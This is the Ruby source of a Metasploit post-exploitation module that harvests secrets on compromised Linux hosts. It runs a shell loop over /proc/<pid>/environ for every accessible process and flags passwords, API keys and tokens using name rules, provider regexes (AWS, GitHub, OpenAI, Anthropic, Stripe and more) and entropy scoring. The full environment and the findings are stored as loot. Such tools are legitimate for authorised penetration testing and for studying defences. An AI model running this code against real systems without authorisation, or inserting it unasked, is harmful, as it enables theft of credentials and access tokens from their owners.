# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  # -- Name-based detection rules ------------------------------------------------
  # Each entry: [id, description, pattern (uppercase), match_kind, confidence]
  #   match_kind: :exact, :prefix, :suffix, :contains
  #   confidence: :high, :medium, :low
  #
  # Ordered from most specific to least specific.
  # Detection rules written for envex, drawing on publicly documented provider
  # token formats and pattern libraries from:
  #   Gitleaks      (MIT)       https://github.com/gitleaks/gitleaks
  #   Betterleaks   (MIT)       https://github.com/chrisandoryan/Betterleaks
  #   Kingfisher    (Apache-2)  https://github.com/trufflesecurity/kingfisher
  NAME_RULES = [
    # Passwords (high)
    ['password', 'Password', 'PASSWORD', :contains, :high],
    ['passwd', 'Password', 'PASSWD', :contains, :high],
    ['pass-suffix', 'Password', '_PASS', :suffix, :high],
    ['pwd-suffix', 'Password', '_PWD', :suffix, :high],
    ['pass-exact', 'Password', 'PASS', :exact, :high],

    # Secrets (high)
    ['secret', 'Secret', 'SECRET', :contains, :high],
    ['private-key', 'Private key', 'PRIVATE_KEY', :contains, :high],
    ['privkey', 'Private key', 'PRIVKEY', :contains, :high],
    ['signing-key', 'Signing key', 'SIGNING_KEY', :contains, :high],
    ['encryption-key', 'Encryption key', 'ENCRYPTION_KEY', :contains, :high],

    # API keys (high)
    ['api-key', 'API key', 'API_KEY', :contains, :high],
    ['apikey', 'API key', 'APIKEY', :contains, :high],
    ['api-secret', 'API secret', 'API_SECRET', :contains, :high],
    ['api-token', 'API token', 'API_TOKEN', :contains, :high],

    # Tokens (high)
    ['access-token', 'Access token', 'ACCESS_TOKEN', :contains, :high],
    ['auth-token', 'Auth token', 'AUTH_TOKEN', :contains, :high],
    ['refresh-token', 'Refresh token', 'REFRESH_TOKEN', :contains, :high],
    ['bearer-token', 'Bearer token', 'BEARER', :contains, :high],
    ['jwt', 'JSON Web Token', 'JWT', :contains, :high],

    # Credentials / auth (high)
    ['credential', 'Credential', 'CREDENTIAL', :contains, :high],
    ['auth-suffix', 'Auth secret', '_AUTH', :suffix, :high],
    ['oauth', 'OAuth secret', 'OAUTH', :contains, :high],

    # Connection strings (high)
    ['connection-string', 'Connection string', 'CONNECTION_STRING', :contains, :high],
    ['conn-str', 'Connection string', 'CONN_STR', :contains, :high],
    ['database-url', 'Database URL', 'DATABASE_URL', :contains, :high],
    ['dsn', 'DSN', 'DSN', :contains, :high],

    # Provider-specific (high)
    ['aws-secret', 'AWS secret key', 'AWS_SECRET_ACCESS_KEY', :exact, :high],
    ['aws-session', 'AWS session token', 'AWS_SESSION_TOKEN', :exact, :high],
    ['github-token', 'GitHub token', 'GITHUB_TOKEN', :exact, :high],
    ['gitlab-token', 'GitLab token', 'GITLAB_TOKEN', :exact, :high],
    ['slack-token', 'Slack token', 'SLACK_TOKEN', :exact, :high],
    ['stripe-key', 'Stripe key', 'STRIPE_SECRET_KEY', :exact, :high],
    ['openai-key', 'OpenAI API key', 'OPENAI_API_KEY', :exact, :high],
    ['anthropic-key', 'Anthropic API key', 'ANTHROPIC_API_KEY', :exact, :high],
    ['sendgrid-key', 'SendGrid API key', 'SENDGRID_API_KEY', :exact, :high],
    ['twilio-token', 'Twilio auth token', 'TWILIO_AUTH_TOKEN', :exact, :high],
    ['docker-password', 'Docker password', 'DOCKER_PASSWORD', :exact, :high],
    ['npm-token', 'NPM token', 'NPM_TOKEN', :exact, :high],
    ['pypi-token', 'PyPI token', 'PYPI_TOKEN', :exact, :high],
    ['nuget-key', 'NuGet API key', 'NUGET_API_KEY', :exact, :high],
    ['gcp-key', 'GCP service account', 'GOOGLE_APPLICATION_CREDENTIALS', :exact, :high],
    ['azure-secret', 'Azure secret', 'AZURE_CLIENT_SECRET', :exact, :high],
    ['vault-token', 'Vault token', 'VAULT_TOKEN', :exact, :high],
    ['circleci-token', 'CircleCI token', 'CIRCLECI_TOKEN', :exact, :high],
    ['travis-token', 'Travis CI token', 'TRAVIS_TOKEN', :exact, :high],
    ['sentry-dsn', 'Sentry DSN', 'SENTRY_DSN', :exact, :high],
    ['datadog-key', 'Datadog API key', 'DD_API_KEY', :exact, :high],
    ['heroku-key', 'Heroku API key', 'HEROKU_API_KEY', :exact, :high],
    ['netlify-token', 'Netlify auth token', 'NETLIFY_AUTH_TOKEN', :exact, :high],
    ['vercel-token', 'Vercel token', 'VERCEL_TOKEN', :exact, :high],
    ['codecov-token', 'Codecov token', 'CODECOV_TOKEN', :exact, :high],

    # Token (medium - generic suffix/prefix)
    ['token-suffix', 'Token', '_TOKEN', :suffix, :medium],
    ['token-prefix', 'Token', 'TOKEN_', :prefix, :medium],

    # Key (medium - generic suffix)
    ['key-suffix', 'Key', '_KEY', :suffix, :medium],
    ['secret-suffix', 'Secret', '_SECRET', :suffix, :medium],

    # Certificates (medium)
    ['certificate', 'Certificate', 'CERTIFICATE', :contains, :medium],
    ['cert-suffix', 'Certificate', '_CERT', :suffix, :medium],
    ['ssl-key', 'SSL key', 'SSL_KEY', :contains, :medium],
    ['tls-key', 'TLS key', 'TLS_KEY', :contains, :medium]
  ].freeze

  # -- Value-based detection rules -----------------------------------------------
  # Each entry: [id, description, regex_pattern, confidence]
  #
  # Patterns sourced from publicly documented provider token format specifications.
  VALUE_RULES = [
    # AWS
    ['aws-access-key', 'AWS access key ID', /(?:^|[^A-Z0-9])AKIA[0-9A-Z]{16}(?:$|[^A-Z0-9])/, :high],

    # GitHub
    ['github-pat', 'GitHub personal access token', /ghp_[A-Za-z0-9]{36}/, :high],
    ['github-oauth', 'GitHub OAuth token', /gho_[A-Za-z0-9]{36}/, :high],
    ['github-app', 'GitHub App token', /ghu_[A-Za-z0-9]{36}/, :high],
    ['github-app-install', 'GitHub App install token', /ghs_[A-Za-z0-9]{36}/, :high],
    ['github-fine-pat', 'GitHub fine-grained PAT', /github_pat_[A-Za-z0-9_]{82}/, :high],

    # GitLab
    ['gitlab-pat', 'GitLab personal access token', /glpat-[A-Za-z0-9\-_]{20,}/, :high],
    ['gitlab-pipeline', 'GitLab pipeline token', /glptt-[A-Za-z0-9\-_]{20,}/, :high],
    ['gitlab-runner', 'GitLab runner token', /glrt-[A-Za-z0-9\-_]{20,}/, :high],

    # Slack
    ['slack-bot', 'Slack bot token', /xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}/, :high],
    ['slack-user', 'Slack user token', /xoxp-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,}/, :high],
    ['slack-app', 'Slack app token', /xapp-[0-9]-[A-Z0-9]{10,13}-[0-9]{12,14}-[a-z0-9]{64}/, :high],
    ['slack-webhook', 'Slack webhook URL', %r{https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[a-zA-Z0-9]{24}}, :high],

    # Stripe
    ['stripe-secret', 'Stripe secret key', /sk_live_[A-Za-z0-9]{24,}/, :high],
    ['stripe-restricted', 'Stripe restricted key', /rk_live_[A-Za-z0-9]{24,}/, :high],
    ['stripe-test', 'Stripe test key', /sk_test_[A-Za-z0-9]{24,}/, :medium],

    # OpenAI
    ['openai-key', 'OpenAI API key', /sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}/, :high],
    ['openai-key-v2', 'OpenAI API key (new)', /sk-proj-[A-Za-z0-9\-_]{40,}/, :high],
    ['openai-key-svc', 'OpenAI service key', /sk-svcacct-[A-Za-z0-9\-_]{40,}/, :high],

    # Anthropic
    ['anthropic-key', 'Anthropic API key', /sk-ant-api03-[A-Za-z0-9\-_]{93}/, :high],

    # Google
    ['google-api-key', 'Google API key', /AIza[A-Za-z0-9\-_]{35}/, :high],
    ['google-oauth', 'Google OAuth secret', /GOCSPX-[A-Za-z0-9\-_]{28}/, :high],

    # Hugging Face
    ['huggingface-token', 'Hugging Face token', /hf_[A-Za-z0-9]{34}/, :high],

    # Twilio
    ['twilio-api-key', 'Twilio API key', /SK[0-9a-fA-F]{32}/, :medium],

    # SendGrid
    ['sendgrid-key', 'SendGrid API key', /SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}/, :high],

    # NPM
    ['npm-token', 'NPM access token', /npm_[A-Za-z0-9]{36}/, :high],

    # PyPI
    ['pypi-token', 'PyPI API token', /pypi-AgEIcHlwaS5vcmc[A-Za-z0-9\-_]{50,}/, :high],

    # HashiCorp Vault
    ['vault-token', 'HashiCorp Vault token', /hvs\.[A-Za-z0-9]{24,}/, :high],
    ['vault-batch', 'Vault batch token', /hvb\.[A-Za-z0-9]{24,}/, :high],

    # DigitalOcean
    ['digitalocean-pat', 'DigitalOcean PAT', /dop_v1_[a-f0-9]{64}/, :high],
    ['digitalocean-oauth', 'DigitalOcean OAuth', /doo_v1_[a-f0-9]{64}/, :high],
    ['digitalocean-refresh', 'DigitalOcean refresh', /dor_v1_[a-f0-9]{64}/, :high],

    # Shopify
    ['shopify-shared', 'Shopify shared secret', /shpss_[a-fA-F0-9]{32}/, :high],
    ['shopify-access', 'Shopify access token', /shpat_[a-fA-F0-9]{32}/, :high],
    ['shopify-custom', 'Shopify custom app', /shpca_[a-fA-F0-9]{32}/, :high],
    ['shopify-private', 'Shopify private app', /shppa_[a-fA-F0-9]{32}/, :high],

    # Mailchimp
    ['mailchimp-key', 'Mailchimp API key', /[a-f0-9]{32}-us[0-9]{1,2}/, :medium],

    # Discord
    ['discord-bot', 'Discord bot token', /[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27,}/, :medium],

    # Telegram
    ['telegram-bot', 'Telegram bot token', /[0-9]{5,15}:[A-Za-z0-9_-]{35}/, :medium],

    # Generic patterns
    ['pem-private-key', 'PEM private key', /-----BEGIN (?:RSA |EC |DSA |OPENSSH |ED25519 )?PRIVATE KEY-----/, :high],
    ['jwt', 'JSON Web Token', %r{eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]+}, :medium],
    ['url-credentials', 'URL with credentials', %r{[a-z]{2,10}://[^:@/\s]+:[^@/\s]+@[^\s]+}, :medium],
    ['bearer-token', 'Bearer token', %r{\ABearer\s+[A-Za-z0-9\-_.~+/]+=*\z}i, :medium]
  ].freeze

  # -- Match specificity ranking --------------------------------------------------
  SPECIFICITY = { exact: 3, prefix: 2, suffix: 2, contains: 1 }.freeze

  # -- Confidence display labels ---------------------------------------------------
  CONFIDENCE_LABEL = { high: 'HIGH', medium: 'MED', low: 'LOW' }.freeze

  # -- Confidence sort order (high first) ------------------------------------------
  CONFIDENCE_ORDER = { high: 0, medium: 1, low: 2 }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Gather Environment Variable Secrets',
        'Description' => %q{
          Extracts environment variables from all accessible processes via
          /proc/<pid>/environ on Linux and flags potential secrets using a
          three-layer detection engine: name heuristics, value pattern matching,
          and Shannon entropy analysis.

          Environment variables are a primary vector for secret exposure in modern
          infrastructure. Processes receive sensitive values such as API keys,
          database credentials, and tokens through their environment. These persist
          in /proc/<pid>/environ for the lifetime of the process and are readable
          by any process with the same UID or by root.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'bcoles' # envex and metasploit
        ],
        'Platform' => ['linux'],
        'References' => [
          ['URL', 'https://github.com/bcoles/envex'],
          ['URL', 'https://github.com/gitleaks/gitleaks'],
          ['URL', 'https://github.com/chrisandoryan/Betterleaks'],
          ['URL', 'https://github.com/trufflesecurity/kingfisher']
        ],
        'SessionTypes' => %w[shell meterpreter],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptInt.new('PID', [false, 'Scan a specific PID only']),
      OptString.new('MATCH_NAME', [false, 'Only scan processes matching this name (substring, case-insensitive)']),
      OptBool.new('ENTROPY', [true, 'Enable Shannon entropy detection for unknown secrets', true]),
      OptFloat.new('MIN_ENTROPY', [true, 'Minimum Shannon entropy threshold (bits per character)', 4.5]),
      OptEnum.new('MIN_CONFIDENCE', [true, 'Minimum confidence level to report', 'LOW', %w[LOW MED HIGH]])
    ])
  end

  def run
    fail_with(Failure::NoTarget, '/proc filesystem not found') unless directory?('/proc')

    min_conf = parse_min_confidence(datastore['MIN_CONFIDENCE'])
    target_pid = datastore['PID']
    match_name = datastore['MATCH_NAME']

    print_status('Enumerating processes from /proc...')
    procs = enumerate_target_processes(target_pid, match_name)

    fail_with(Failure::NoAccess, 'No accessible processes found') if procs.empty?

    print_status("Found #{procs.length} accessible process(es)")

    # Store all environment variables as loot (deduplicated, sorted)
    store_all_env(procs)

    print_status('Analyzing environment variables...')

    all_findings = []
    procs.each do |proc_info|
      proc_info[:env_vars].each do |name, value|
        detections = analyze(name, value)
        next if detections.empty?

        detections.each do |detection|
          next if CONFIDENCE_ORDER[detection[:confidence]] > CONFIDENCE_ORDER[min_conf]

          all_findings << {
            pid: proc_info[:pid],
            process_name: proc_info[:name],
            uid: proc_info[:uid],
            env_name: name,
            env_value: value,
            rule_id: detection[:rule_id],
            description: detection[:description],
            confidence: detection[:confidence],
            source: detection[:source]
          }
        end
      end
    end

    # Sort: confidence desc, then source (name > value > entropy), then PID, then env_name
    all_findings.sort_by! do |finding|
      [
        CONFIDENCE_ORDER[finding[:confidence]],
        source_order(finding[:source]),
        finding[:pid],
        finding[:env_name]
      ]
    end

    if all_findings.empty?
      print_status('No secrets detected')
      return
    end

    print_good("Found #{all_findings.length} potential secret(s)")

    # Build output report
    report_lines = []
    all_findings.each do |finding|
      conf_label = CONFIDENCE_LABEL[finding[:confidence]]
      report_lines << format(
        '[%s] [%s] [pid:%s] [%s] %s=%s',
        conf_label,
        finding[:description],
        finding[:pid],
        finding[:process_name],
        finding[:env_name],
        finding[:env_value]
      )
    end

    output = report_lines.join("\n")
    print_line("\n#{output}\n")

    path = store_loot(
      'linux.enum.env_secrets',
      'text/plain',
      session,
      output,
      'env_secrets.txt',
      'Environment variable secrets'
    )
    print_good("Results saved to #{path}")
  end

  private

  # ---------------------------------------------------------------------------
  # Process enumeration via /proc
  # ---------------------------------------------------------------------------

  # Store all environment variables across all processes as loot.
  # Deduplicates by name=value and sorts alphabetically.
  def store_all_env(procs)
    seen = Set.new
    lines = []

    procs.each do |proc_info|
      proc_info[:env_vars].each do |name, value|
        entry = "#{name}=#{value}"
        next if seen.include?(entry)

        seen.add(entry)
        lines << entry
      end
    end

    return if lines.empty?

    lines.sort_by!(&:downcase)
    output = lines.join("\n")

    path = store_loot(
      'linux.enum.environment',
      'text/plain',
      session,
      output,
      'environment.txt',
      "Environment variables from #{procs.length} process(es)"
    )
    print_good("All environment variables saved to #{path}")
  end

  # ---------------------------------------------------------------------------

  # Enumerate target processes by collecting environ, comm, and uid from /proc
  # in a single command to minimize session round trips.
  # Returns an array of hashes with :pid, :name, :uid, :env_vars.
  def enumerate_target_processes(target_pid, match_name)
    output = collect_proc_data(target_pid)
    return [] if output.blank?

    procs = parse_proc_output(output)

    if match_name
      procs.select! { |proc_info| proc_info[:name].downcase.include?(match_name.downcase) }
    end

    procs.sort_by { |proc_info| proc_info[:pid].to_i }
  end

  # Run a single shell command to collect environ, comm, and uid for all
  # accessible processes (or a single PID) from /proc.
  #
  # Output format per process (one record per accessible PID):
  #   ===PROC_START===
  #   PID=<pid>
  #   COMM=<comm>
  #   UID=<uid>
  #   ENV=<base64 of raw NUL-delimited environ>
  #   ===PROC_END===
  #
  # Base64 encoding preserves values that contain newlines.
  # Labeled lines avoid ambiguity from colons in comm (e.g. kworker/u8:1).
  def collect_proc_data(target_pid)
    if target_pid
      cmd = <<~CMD.gsub(/\s+/, ' ').strip
        comm=$(cat /proc/#{target_pid}/comm 2>/dev/null);
        uid=$(awk '/^Uid:/{print $2}' /proc/#{target_pid}/status 2>/dev/null);
        env=$(base64 -w0 /proc/#{target_pid}/environ 2>/dev/null);
        [ -n "$env" ] && printf '===PROC_START===\\nPID=%s\\nCOMM=%s\\nUID=%s\\nENV=%s\\n===PROC_END===\\n' #{target_pid} "$comm" "$uid" "$env"
      CMD
    else
      cmd = <<~'CMD'.gsub(/\s+/, ' ').strip
        for p in /proc/[0-9]*/environ; do
        pid=${p#/proc/}; pid=${pid%%/environ};
        comm=$(cat /proc/$pid/comm 2>/dev/null);
        uid=$(awk '/^Uid:/{print $2}' /proc/$pid/status 2>/dev/null);
        env=$(base64 -w0 "$p" 2>/dev/null);
        [ -n "$env" ] && printf '===PROC_START===\nPID=%s\nCOMM=%s\nUID=%s\nENV=%s\n===PROC_END===\n' "$pid" "$comm" "$uid" "$env";
        done 2>/dev/null
      CMD
    end
    cmd_exec(cmd)
  rescue StandardError => e
    vprint_error("Failed to collect process data: #{e.message}")
    nil
  end

  # Parse the structured output from collect_proc_data into process hashes.
  # Each record is delimited by ===PROC_START=== / ===PROC_END=== with
  # labeled fields and base64-encoded environ data.
  def parse_proc_output(output)
    procs = []
    current = nil

    output.each_line do |line|
      line = line.chomp
      case line
      when '===PROC_START==='
        procs << current if current && !current[:env_vars].empty?
        current = { pid: nil, name: 'unknown', uid: nil, env_vars: [] }
      when '===PROC_END==='
        procs << current if current && !current[:env_vars].empty?
        current = nil
      when /\APID=(\d+)\z/
        current[:pid] = ::Regexp.last_match(1).to_i if current
      when /\ACOMM=(.*)\z/
        current[:name] = ::Regexp.last_match(1) if current && !::Regexp.last_match(1).empty?
      when /\AUID=(\d+)\z/
        current[:uid] = ::Regexp.last_match(1).to_i if current
      when /\AENV=(.*)\z/
        next unless current

        raw = Rex::Text.decode_base64(::Regexp.last_match(1))
        raw.split("\0").each do |entry|
          next if entry.empty?

          key, value = entry.split('=', 2)
          current[:env_vars] << [key, value.to_s] unless key.nil? || key.empty?
        end
      end
    end
    procs << current if current && !current[:env_vars].empty?

    procs
  end

  # ---------------------------------------------------------------------------
  # Three-layer detection engine
  # ---------------------------------------------------------------------------

  # Analyze a single environment variable. Returns an array of detection hashes.
  def analyze(name, value)
    detections = []

    # Layer 1: Name heuristics (take best match)
    best = detect_by_name(name)
    detections << best if best

    # Layer 2: Value pattern matching (collect all hits)
    detect_by_value(value).each { |det| detections << det }

    # Layer 3: Entropy fallback (only when no other detections)
    if datastore['ENTROPY'] && detections.empty?
      entropy_hit = detect_by_entropy(value)
      detections << entropy_hit if entropy_hit
    end

    detections
  end

  # Layer 1: Match environment variable name against name rules.
  # Returns the single best (most specific, highest confidence) match, or nil.
  def detect_by_name(name)
    upper = name.upcase
    best = nil
    best_specificity = 0
    best_confidence = :low

    NAME_RULES.each do |id, description, pattern, match_kind, confidence|
      matched = case match_kind
                when :exact then upper == pattern
                when :prefix then upper.start_with?(pattern)
                when :suffix then upper.end_with?(pattern)
                when :contains then upper.include?(pattern)
                else false
                end
      next unless matched

      spec = SPECIFICITY[match_kind]
      conf_ord = CONFIDENCE_ORDER[confidence]

      # Prefer higher confidence, then higher specificity
      next unless best.nil? || conf_ord < CONFIDENCE_ORDER[best_confidence] ||
                  (conf_ord == CONFIDENCE_ORDER[best_confidence] && spec > best_specificity)

      best = {
        rule_id: id,
        description: description,
        confidence: confidence,
        source: :name
      }
      best_specificity = spec
      best_confidence = confidence
    end

    best
  end

  # Layer 2: Match environment variable value against value regex rules.
  # Returns all matching detections.
  def detect_by_value(value)
    trimmed = value.strip
    return [] if trimmed.empty?

    detections = []
    VALUE_RULES.each do |id, description, regex, confidence|
      next unless regex.match?(trimmed)

      detections << {
        rule_id: id,
        description: description,
        confidence: confidence,
        source: :value
      }
    end
    detections
  end

  # Layer 3: Shannon entropy analysis for high-entropy values that didn't
  # match any name or value rule. Returns a detection hash or nil.
  def detect_by_entropy(value)
    trimmed = value.strip
    return nil if trimmed.length < 16

    threshold = datastore['MIN_ENTROPY']
    ent = shannon_entropy(trimmed)
    return nil if ent < threshold

    {
      rule_id: 'entropy',
      description: format('High entropy value (%.2f bits)', ent),
      confidence: :low,
      source: :entropy
    }
  end

  # Calculate Shannon entropy in bits per character.
  def shannon_entropy(str)
    return 0.0 if str.empty?

    len = str.length.to_f
    freq = Hash.new(0)
    str.each_byte { |b| freq[b] += 1 }
    freq.values.sum do |count|
      p = count / len
      -p * Math.log2(p)
    end
  end

  # ---------------------------------------------------------------------------
  # Sorting helpers
  # ---------------------------------------------------------------------------

  # Sort order for detection source: name (0) > value (1) > entropy (2).
  def source_order(source)
    case source
    when :name then 0
    when :value then 1
    when :entropy then 2
    else 3
    end
  end

  # Parse the MIN_CONFIDENCE option string into a symbol.
  def parse_min_confidence(str)
    case str.to_s.upcase
    when 'HIGH' then :high
    when 'MED' then :medium
    else :low
    end
  end
end
